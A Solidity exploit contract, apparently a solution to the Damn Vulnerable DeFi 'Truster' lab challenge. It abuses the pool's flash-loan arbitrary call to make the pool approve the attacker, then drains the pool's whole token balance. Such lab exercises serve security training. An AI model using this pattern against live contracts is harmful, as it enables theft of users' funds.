// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Attacker {
    address public immutable attacker;
    address public immutable target;
    address public immutable dvt;

    constructor(address _target, address _dvt) {
        attacker = msg.sender;
        target = _target;
        dvt = _dvt;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    function attack() external onlyAttacker {
        require(target != address(0) && dvt != address(0));

        bytes memory _calldata = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        TrusterLenderPool(target).flashLoan(0, address(this), dvt, _calldata);
        IERC20(dvt).transferFrom(target, attacker, IERC20(dvt).balanceOf(target));
    }
}
